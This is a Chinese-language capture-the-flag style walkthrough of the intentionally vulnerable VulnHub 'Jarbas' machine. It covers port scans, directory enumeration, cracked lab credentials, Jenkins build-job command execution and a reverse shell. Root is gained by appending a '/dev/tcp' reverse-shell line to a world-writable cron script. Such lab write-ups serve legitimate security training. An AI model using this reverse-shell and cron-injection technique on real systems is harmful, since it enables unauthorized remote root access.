# 靶机信息
jarbas是vulnhub中的一台简单类型的渗透测试靶机

# 初始信息探测


## nmap扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
└─$ nmap -sT -p- --min-rate 10000 192.168.218.191 -oA nmapScan/ports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:42 EDT
Nmap scan report for 192.168.218.191
Host is up (0.00098s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:58:A8:3F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds

┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
└─$ nmap -sU -p- --min-rate 10000 192.168.218.191 -oA nmapScan/udp  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:43 EDT
Warning: 192.168.218.191 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.218.191
Host is up (0.00081s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT      STATE SERVICE
33848/udp open  unknown
MAC Address: 00:0C:29:58:A8:3F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.87 seconds

```
不要忘了udp的扫描

再进行详解的服务扫描和漏洞扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
└─$ nmap -sV -p22,80,3306,8080 -O 192.168.218.191 -oA nmapScan/detail
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:50 EDT
Nmap scan report for 192.168.218.191
Host is up (0.00026s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
MAC Address: 00:0C:29:58:A8:3F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds


┌──(kali㉿kali)-[~]                                                                                                                                                                  08:48:02 [8/51]
└─$ nmap --script=vuln -p22,80,3306,8080 192.168.218.191 -oA RedteamStu/stageOne/writeup/vulnhub/jarbas/nmapScan/vuln                                                                               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:47 EDT                                                                                                                                     
Nmap scan report for 192.168.218.191                                                                                                                                                                
Host is up (0.00026s latency).                                                                                                                                                                      
                                                                                                                                                                                                    
PORT     STATE SERVICE                                                                                                                                                                              
22/tcp   open  ssh                                                                                                                                                                                  
80/tcp   open  http                                                                                                                                                                                 
|_http-trace: TRACE is enabled
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.218.191:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.218.191:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
|_    http://192.168.218.191:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.218.191
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.218.191:80/
|     Form id: wmtb
|     Form action: /web/submit
|     
|     Path: http://192.168.218.191:80/
|     Form id: 
|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php
|     
|     Path: http://192.168.218.191:80/
|     Form id: 
|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:58:A8:3F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 39.98 seconds

```

## WEB枚举
先看80端口，nmap的漏洞扫描可以扫出来了可能的漏洞，目录扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
└─$ gobuster dir -u http://192.168.218.191 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 32808]
/access.html          (Status: 200) [Size: 359]
/index.html           (Status: 200) [Size: 32808]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================



┌──(kali㉿kali)-[~]                                                                                                                                                                                 
└─$ dirsearch -u http://192.168.218.191 -e php,html,txt                                                                                                                                             
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html                    
  from pkg_resources import DistributionNotFound, VersionConflict                                                                                                                                   
                                                                                                                                                                                                    
  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                                                                             
                                                                                                                                                                                                    
Extensions: php, html, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10403                                                                                                                  
                                                                                                                                                                                                    
Output File: /home/kali/reports/http_192.168.218.191/_25-07-23_09-09-28.txt                                                                                                                         
                                                                                                                                                                                                    
Target: http://192.168.218.191/                                                                                                                                                                     
                                                                                                                                                                                                    
[09:09:28] Starting:                                                                                                                                                                                
[09:09:29] 403 -  213B  - /.ht_wsr.txt                                                                                                                                                              
[09:09:29] 403 -  216B  - /.htaccess.bak1                                                                                                                                                           
[09:09:29] 403 -  216B  - /.htaccess.orig                                                                                                                                                           
[09:09:29] 403 -  216B  - /.htaccess.save                                                                                                                                                           
[09:09:29] 403 -  218B  - /.htaccess.sample                                                                                                                                                         
[09:09:29] 403 -  217B  - /.htaccess_extra                                                                                                                                                          
[09:09:29] 403 -  214B  - /.htaccess_sc                                                                                                                                                             
[09:09:29] 403 -  216B  - /.htaccess_orig                                                                                                                                                           
[09:09:29] 403 -  214B  - /.htaccessBAK                                                                                                                                                             
[09:09:29] 403 -  214B  - /.htaccessOLD                                                                                                                                                             
[09:09:29] 403 -  215B  - /.htaccessOLD2                                                                                                                                                            
[09:09:29] 403 -  206B  - /.htm                   
[09:09:29] 403 -  207B  - /.html                  
[09:09:29] 403 -  216B  - /.htpasswd_test         
[09:09:29] 403 -  212B  - /.htpasswds
[09:09:29] 403 -  213B  - /.httr-oauth
[09:09:31] 200 -  359B  - /access.html            
[09:09:36] 403 -  210B  - /cgi-bin/               
                                                  
Task Completed
```

以防万一都扫一下

只扫出来一个access.html页面看一下，好像是三组凭证，密码加密，尝试解密，我使用的[解密网站](https://hashes.com/en/decrypt/hash)，感觉还行，三个密码都破解了。但是都试了一下ssh，无法登录。
>tiago:italia99
>trindade:marianna
>eder:vipsu

<img width="1919" height="645" alt="Image" src="https://github.com/user-attachments/assets/a1149d53-caf1-450d-8bf8-c9ef17cb796e" />

接着走，主页还有一个搜索框和登录登录功能，都会跳转到 **http://192.168.218.191/web/20020720170457/http://jarbas.com.br:80/** 但是都会返回404

再看看8080端口，是一个jenkins服务器，要登陆用上面的凭证试一下，只有这个 **eder:vipsu** 凭证登录进去了
登陆进来了，比较简单，构建新项目执行命令

<img width="1919" height="1040" alt="Image" src="https://github.com/user-attachments/assets/19adf448-7fb0-4425-bed2-65cd50ddde16" />

<img width="1919" height="1036" alt="Image" src="https://github.com/user-attachments/assets/e013f654-7089-436c-9538-503778bba71f" />

再kali上监听4444端口，拿反弹shell

```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/jarbas/nmapScan]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.218.148] from (UNKNOWN) [192.168.218.191] 52456
bash: no job control in this shell
bash-4.2$ id
id
uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
bash-4.2$ 
```

## 提权
翻找了一会，没发现提权的信息，也登录不上eder的账户，然后再找，在看定时任务的时候有发现

```
bash-4.2$ cat /etc/crontab
cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
bash-4.2$ ls -la /etc/script/CleaningSce^Hript.sh
ls -la /etc/script/CleaningScript.sh
-rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh
```

并且这个脚本权限为777，那就简单了，直接追加反弹 shell 命令
`echo "bash -i >& /dev/tcp/192.168.218.148/4444 0>&1" >> /etc/script/CleaningScript.sh`

在kali上开启监听，然后等待定时任务执行，就可以提权了。

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444          
listening on [any] 4444 ...
connect to [192.168.218.148] from (UNKNOWN) [192.168.218.191] 52458
bash: no job control in this shell
[root@jarbas ~]# ls
ls
flag.txt
[root@jarbas ~]# id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
[root@jarbas ~]# 
```
好了提权成功

## 反思
这个靶机比较简单，考察信息检索的能力，以及对检索到的信息的利用，以及对这些开源的服务器的漏洞利用，提权也比较简单，主要是寻找自动任务的思路。

